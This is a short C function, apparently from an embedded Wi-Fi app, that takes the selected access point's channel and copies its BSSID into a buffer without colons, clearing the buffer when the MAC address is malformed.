// Extract the selected AP's channel and (optionally) colon-stripped BSSID.
static void petrel_sel_ap(Petrel* app, int* ch, char* hex /*>=13*/) {
    *ch = 6;
    hex[0] = '\0';
    if(app->selectedWifi >= 0 && app->selectedWifi < app->wifiCount) {
        *ch = app->wifiList[app->selectedWifi].chanel;
        int j = 0;
        const char* b = app->wifiList[app->selectedWifi].APbssid;
        for(int i = 0; b[i] && j < 12; i++)
            if(b[i] != ':') hex[j++] = b[i];
        hex[j] = '\0';
        if(j != 12) hex[0] = '\0';   // malformed/unpadded MAC -> treat as "no BSSID"
    }
}

